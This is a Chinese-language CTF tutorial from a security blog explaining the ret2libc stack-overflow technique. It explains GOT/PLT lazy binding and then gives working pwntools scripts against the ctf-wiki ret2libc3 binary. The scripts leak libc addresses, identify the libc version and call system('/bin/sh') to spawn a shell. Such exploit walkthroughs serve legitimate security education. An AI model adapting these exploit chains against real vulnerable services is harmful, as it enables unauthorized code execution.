---
title: Pwn入门之ret2libc详解
url: https://www.anquanke.com/post/id/286999
source: 安全客-有思想的安全新媒体
date: 2023-03-07
fetch_date: 2025-10-04T08:46:41.530545
---

# Pwn入门之ret2libc详解

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# Pwn入门之ret2libc详解

阅读量**531585**

发布时间 : 2023-03-06 10:30:35

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## 前言

之前曾在Pwn入门之基础栈溢出里面曾经提过ret2libc的相关知识，但是写的比较笼统，感觉对新手还是不够友好，想通过本文对ret2libc的原理和利用进行详细讲解。

## 前置知识

### GOT表和PLT表

got表也叫全局偏移表（Global Offset Table）是Linux ELF文件中用于定位全局变量和函数的一个表。

plt表也叫过程链接表（Procedure Linkage Table）是Linux ELF文件中用于延迟绑定的表恶，即函数第一次被调用的时候才进行绑定。

在程序运行过程中，plt表和got表的运行过程大致如下：

![]()

用一句话来总结就是，可执行文件里保存的是plt表的地址，对应plt地址指向的是got的地址，got表指向的是glibc中的地址

在这里如果需要通过plt表获取函数的地址，需要保证got表已经获取了正确的地址，但如果一开始对所有函数都进行了重定位是比较麻烦且浪费资源，为此，Linux引入了延迟绑定机制。

### 延迟绑定

这种机制存在的目的是glibc为了节约系统资源，提高性能。其详细过程如下

源程序在第一次调用一个函数时，首先去

如果存在一个tide函数，这个函数在plt中的条目为tide[@plt](https://github.com/plt "@plt")，在got中的条目为tide[@got](https://github.com/got "@got")，那么在第一次调用bar函数时，首先会跳转到plt，伪代码如下：

```
tide@plt;
jmp tide@got
patch tide@got
```

这里会从PLT跳到GOT，如果函数从来没有调用过，那这时GOT会跳转回PLT并调用patch tide[@got](https://github.com/got "@got")，这行代码的作用是将bar函数真正的地址填充到tide[@got](https://github.com/got "@got")，然后跳转到bar函数真正的地址执行代码。当下次再次调用bar函数的时候，执行路径就是先跳转到tide[@plt](https://github.com/plt "@plt")、tide[@got](https://github.com/got "@got")、tide真正的地址。

简而言之就是，当一个函数被调用过后，got表里保存了他在内存中的地址，可以通过泄漏got表内存来泄漏函数地址，然后可以根据起泄漏的函数地址获得其libc版本，从而计算其他函数在内存空间中的地址。因为libc中任意两个函数之间的偏移是固定的。

以计算system函数在内存空间中的函数地址举例。

1. 获取`__libc_start_main`函数在内存空间中的地址`addr_main`
2. `__libc_start_main`函数相对于`libc.so.6`的起始地址是`addr_main_offset`
3. system函数相对于`libc.so.6`的起始地址是`addr_system_offset`
4. 则`system`函数在内存中真正的地址为`addr_main`+`addr_system_offset`–`addr_main_offset`

在我们ret2libc中我们只需要理解为，只有执行过的函数，我们才能通过got表泄漏其地址。

## 基本思路

ret2libc是控制函数执行libc中的函数，通常是返回至某个函数的plt处。一般情况下，会选择执行system(‘/bin/sh’)，因此需要找到system函数的地址

看到这里相信有的师傅就会问了，为什么不能直接跳到got表，通过前面的前置知识我们知道plt表中的地址对应的是指令，got表中的地址对应的是指令地址，而返回地址必须保存一段有效的汇编指令，所以必须要用plt表

ret2libc通常可以分为下面几种类型：

* 程序中自身包含system函数和”/bin/sh”字符串
* 程序中自身就有system函数，但是没有”/bin/sh”字符串
* 程序中自身没有syetem函数和”/bin/sh”字符串，但给出了libc.so文件
* 程序中自身没有sysetm函数和”/bin/sh”字符串，并且没有给出libc.so文件

针对前面那三种在前面的文章中已经进行过详细讲解，本文主要是针对第四种情况进行讲解

对于没有给出libc.so文件的程序，我们可以通过泄漏出程序当中的某个函数的地址，通过查询来找出其中使用lib.so版本是哪一个，然后根据lib.so的版本去找到我们需要的system函数的地址。

针对常见的题目我们的解题思路是这样的：

1. 利用栈溢出及puts函数泄漏出在got表中`__libc_start_main`函数的地址
2. puts函数的返回地址为\_start函数
3. 利用最低的12位找出libc版本（即使程序有ASLR保护，也只是针对地址中间位进行随机，最低的12位并不会发生改变）
4. 利用找到的libc版本计算system函数和/bin/sh字符串在内存中的正确的地址

## 实战

我们还是利用ctfwiki中的ret2libc3进行讲解

分析程序

![]()

根据前面分析的，我们需要找到如下几个地址

* `__libc_start_main`函数在got表的地址
* `_start`函数的地址
* `puts`函数在`plt`表中的地址

`__libc_start_main`函数在got表中的地址

![]()

`_start`函数的地址

![]()

`puts`函数在`plt`表中的地址

![]()

获取到这三个地址后，我们可以采用调用`puts`函数后，`ret`到`main`函数，用`main`函数里面的`gets`来获取`libc_start`的地址

![]()

获取libc\_start地址的脚本如下

```
from pwn import *
sh = process('./ret2libc3')
puts_plt = 0x8048460
addr_start = 0x80484d0
got_libc_start = 0x804a024
payload = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_libc_start)
sh.recv()
sh.sendline(payload)
puts_addr = u32(sh.recv(4))
success("__libc_start_addr is:" + hex(puts_addr))
sh.recv()
```

![]()

即使程序有ASLR保护，也只是针对地址中间位进行随机，最低的12位并不会发生改变，在16进制中也就是我们的最后3位，因此cd0是不会变，使用`libc database search`([https://libc.blukat.me/)进行查询（网上普遍推荐的是利用LibcSearcher，但是我用LibcSearcher一直没打通）](https://libc.blukat.me/%29%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%88%E7%BD%91%E4%B8%8A%E6%99%AE%E9%81%8D%E6%8E%A8%E8%8D%90%E7%9A%84%E6%98%AF%E5%88%A9%E7%94%A8LibcSearcher%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E7%94%A8LibcSearcher%E4%B8%80%E7%9B%B4%E6%B2%A1%E6%89%93%E9%80%9A%EF%BC%89)

![]()

看到这么多libc版本挨个试可能会累死，于是再来泄漏个`puts`的地址

```
from pwn import *

sh = process('./ret2libc3')
puts_plt = 0x8048460
addr_start = 0x80484d0
got_libc_start = 0x804a024
got_puts = 0x804a018

# 获取__libc_start的地址
payload1 = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_libc_start)
sh.recv()
sh.sendline(payload1)
libc_start_addr = u32(sh.recv(4))
success("__libc_start_addr is:" + hex(libc_start_addr))
# 获取puts的地址
payload2 = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_puts)
sh.recv()
sh.sendline(payload2)
puts_addr = u32(sh.recv(4))
success("puts_addr is:" + hex(puts_addr))
```

![]()

![]()

还剩下三个了，使用下面的脚本挨个尝试吧

```
from pwn import *

sh = process('./ret2libc3')
puts_plt = 0x8048460
addr_start = 0x80484d0
got_libc_start = 0x804a024
got_puts = 0x804a018

# 获取__libc_start的地址
payload1 = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_libc_start)
sh.recv()
sh.sendline(payload1)
libc_start_addr = u32(sh.recv(4))
success("__libc_start_addr is:" + hex(libc_start_addr))
# 获取puts的地址
payload2 = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_puts)
sh.recv()
sh.sendline(payload2)
puts_addr = u32(sh.recv(4))
success("puts_addr is:" + hex(puts_addr))
sh.recv()

libc_start = #通过libc database search获取
libc_system = #通过libc database search获取
libc_binsh = #通过libc database search获取

libcbase = libc_start_addr - libc_start
system_addr = libcbase + libc_system
binsh_addr = libcbase + libc_binsh

payload = 112 * b'a' + p32(system_addr) + 4 * b'a' + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()
```

![]()

最终经过多次实验可知，libc文件是`libc6_2.31-0ubuntu9_i386`

最终的完整脚本如下

```
from pwn import *

sh = process('./ret2libc3')
puts_plt = 0x8048460
addr_start = 0x80484d0
got_libc_start = 0x804a024
got_puts = 0x804a018

# 获取__libc_start的地址
payload1 = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_libc_start)
sh.recv()
sh.sendline(payload1)
libc_start_addr = u32(sh.recv(4))
success("__libc_start_addr is:" + hex(libc_start_addr))
# 获取puts的地址
payload2 = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_puts)
sh.recv()
sh.sendline(payload2)
puts_addr = u32(sh.recv(4))
success("puts_addr is:" + hex(puts_addr))
sh.recv()

libc_start = 0x01edf0
libc_system = 0x045830
libc_binsh = 0x192352

libcbase = libc_start_addr - libc_start
system_addr = libcbase + libc_system
binsh_addr = libcbase + libc_binsh

payload = 112 * b'a' + p32(system_addr) + 4 * b'a' + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()
```

成功打通

![]()

## 总结

ret2libc这种题型，相较于前面简单的题目，对Linux中程序运行的理解要求更高，一开始根据网上的教程去寻找libc版本的时候发现大多数教程都是使用脚本去获取，但在自己尝试的时候就一直打不通，于是便放弃了脚本采用手工的方式进行查找，可能相较于通过脚本直接获取更加费时费力，但是也通过这个倒逼自己将got表和plt表的相关知识彻底理解透彻，也捋清楚了程序在Linux中到底是如何运行的。

参考链接：

<https://www.yuque.com/hxfqg9/bin/ug9gx5#qQDLq>

<https://introspelliam.github.io/2017/08/03/pwn/got%E3%80%81plt%E8%A1%A8%E4%BB%8B%E7%BB%8D/>

<https://blog.csdn.net/AcSuccess/article/details/104335514>

本文翻译自 原文链接。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**Tide安全团队**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/286999](/post/id/286999)

安全KER - 有思想的安全新媒体

本文转载自:

如若转载,请注明出处：

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [Pwn](/tag/Pwn)

**+1**7赞

收藏

![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png)Tide安全团队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p2.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png)](/member.html?memberId=142933)

[Tide安全团队](/member.html?memberId=142933)

Tide安全团队正式成立于2019年1月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，目前聚集了十多位专业的安全攻防技术研究人员，专注于网络攻防、Web安全、移动终端、安全开发、IoT/物联网/工控安全等方向。

* 文章
* **83**

* 粉丝
* **71**

### TA的文章

* ##### [windows应急响应](/post/id/287417)

  2023-03-15 15:30:13
* ##### [初识内存取证-volatility与Easy\_dump](/post/id/287019)

  2023-03-08 14:30:12
* ##### [车联网安全入门之从CAN模拟环境搭建到重放攻击](/post/id/287021)

  2023-03-06 15:30:43
* ##### [Pwn入门之ret2libc详解](/post/id/286999)

  2023-03-06 10:30:35
* ##### [Windows Defender的一些渗透知识](/post/id/285521)

  2023-01-18 10:30:41

### 相关文章

* ##### [从一道题入门 UEFI PWN](/post/id/283073)

  2022-11-11 15:30:05
* ##### [WMCTF 2022 挑战赛 chess writeup](/post...